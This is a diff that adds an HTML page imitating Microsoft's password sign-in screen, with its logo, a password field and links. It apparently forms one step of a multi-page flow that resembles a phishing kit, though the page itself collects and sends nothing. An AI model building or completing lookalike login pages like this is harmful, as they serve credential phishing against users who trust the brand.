@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Password - Microsoft</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body {
+  width: 100%; min-height: 100vh;
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: linear-gradient(135deg, #eceef5 0%, #e2e6f0 50%, #d8dff0 100%);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 20px;
+}
+
+.card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+  padding: clamp(24px, 4vw, 44px) clamp(24px, 4vw, 44px);
+  width: min(460px, 90%);
+  display: flex; flex-direction: column; align-items: center;
+  text-align: center;
+}
+
+.top-row {
+  display: flex; align-items: center; justify-content: center;
+  width: 100%; position: relative; margin-bottom: 5%;
+}
+.back {
+  position: absolute; left: 0;
+  background: none; border: none;
+  font-size: clamp(16px, 3vw, 22px);
+  color: #333; cursor: pointer;
+  padding: 4px 6px; border-radius: 2px;
+}
+.back:hover { background: #f2f2f2; }
+
+.ms-logo { display: flex; align-items: center; gap: 8px; }
+.ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 20px; height: 20px; }
+.ms-grid span { display: block; }
+.ms-name { font-size: clamp(14px, 2.5vw, 18px); font-weight: 600; color: #1b1b1b; }
+
+.pill {
+  padding: 4px 16px; border-radius: 20px;
+  background: #fff; border: 1px solid #d2d0ce;
+  font-size: clamp(11px, 2vw, 13px); color: #323130;
+  white-space: nowrap; max-width: 90%;
+  overflow: hidden; text-overflow: ellipsis;
+  margin-bottom: 5%;
+}
+
+h1 { font-size: clamp(20px, 4vw, 26px); font-weight: 700; color: #1b1b1b; margin-bottom: 5%; }
+
+/* champ mot de passe avec label flottant */
+.field-wrap {
+  position: relative; width: 100%;
+  border: 1px solid #c8c6c4; border-radius: 2px;
+  margin-bottom: 3%;
+}
+.field-wrap:focus-within { border-color: #0078d4; border-width: 2px; }
+.field-wrap label {
+  position: absolute; left: 12px; top: 50%;
+  transform: translateY(-50%);
+  font-size: clamp(12px, 2vw, 14px); color: #605e5c;
+  pointer-events: none; transition: all 0.15s;
+}
+.field-wrap input:focus + label,
+.field-wrap input:not(:placeholder-shown) + label {
+  top: 10px; transform: none; font-size: 10px; color: #0078d4;
+}
+.field-wrap input:not(:focus):not(:placeholder-shown) + label { color: #605e5c; }
+.field-wrap input {
+  width: 100%;
+  height: clamp(44px, 6vh, 54px);
+  padding: 18px 40px 6px 12px;
+  font-size: clamp(13px, 2vw, 15px);
+  font-family: inherit; background: transparent;
+  border: none; outline: none; color: #1b1b1b;
+}
+.eye {
+  position: absolute; right: 10px; top: 50%;
+  transform: translateY(-50%);
+  background: none; border: none; cursor: pointer;
+  font-size: 16px; color: #605e5c; padding: 4px;
+}
+
+.blue-link {
+  align-self: flex-start;
+  font-size: clamp(12px, 2vw, 14px); color: #0078d4;
+  text-decoration: none; cursor: pointer;
+  background: none; border: none;
+  font-family: inherit; margin-bottom: 6%;
+}
+.blue-link:hover { text-decoration: underline; }
+
+.btn {
+  width: 100%;
+  height: clamp(40px, 6vh, 50px);
+  background: #0078d4; color: #fff;
+  font-size: clamp(13px, 2vw, 15px); font-weight: 600;
+  font-family: inherit; border: none; border-radius: 2px;
+  cursor: pointer; transition: background 0.1s; margin-bottom: 5%;
+}
+.btn:hover { background: #106ebe; }
+
+.other-link {
+  font-size: clamp(12px, 2vw, 14px); color: #0078d4;
+  text-decoration: none; cursor: pointer;
+  background: none; border: none; font-family: inherit;
+}
+.other-link:hover { text-decoration: underline; }
+
+.footer {
+  margin-top: 5%;
+  font-size: clamp(10px, 1.5vw, 12px); color: #605e5c; text-align: center;
+}
+.footer a { color: #605e5c; text-decoration: none; margin: 0 8px; }
+.footer a:hover { text-decoration: underline; }
+.footer-bottom { margin-top: 4px; }
+.footer-bottom a { color: #0078d4; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="top-row">
+    <button class="back" onclick="window.location.href='index.html'">←</button>
+    <div class="ms-logo">
+      <div class="ms-grid">
+        <span style="background:#f25022"></span>
+        <span style="background:#7fba00"></span>
+        <span style="background:#00a4ef"></span>
+        <span style="background:#ffb900"></span>
+      </div>
+      <span class="ms-name">Microsoft</span>
+    </div>
+  </div>
+
+  <div class="pill" id="pill"></div>
+
+  <h1>Enter your password</h1>
+
+  <div class="field-wrap">
+    <input id="pwdInput" type="password" placeholder=" " autocomplete="current-password">
+    <label>Password</label>
+    <button class="eye" type="button" onclick="togglePwd()">👁</button>
+  </div>
+
+  <button class="blue-link">Forgot your password?</button>
+
+  <button class="btn" onclick="next()">Next</button>
+
+  <button class="other-link">Other ways to sign in</button>
+</div>
+
+<div class="footer">
+  <div>
+    <a href="#">Help and feedback</a>
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy and cookies</a>
+  </div>
+  <div class="footer-bottom">
+    Use private browsing if this is not your device. <a href="#">Learn more</a>
+  </div>
+</div>
+
+<script>
+const email = sessionStorage.getItem('email') || 'email@exemple.com';
+document.getElementById('pill').textContent = email;
+
+function next() {
+  window.location.href = 'verify.html';
+}
+function togglePwd() {
+  const i = document.getElementById('pwdInput');
+  i.type = i.type === 'password' ? 'text' : 'password';
+}
+document.getElementById('pwdInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') next();
+});
+</script>
+</body>
+</html>
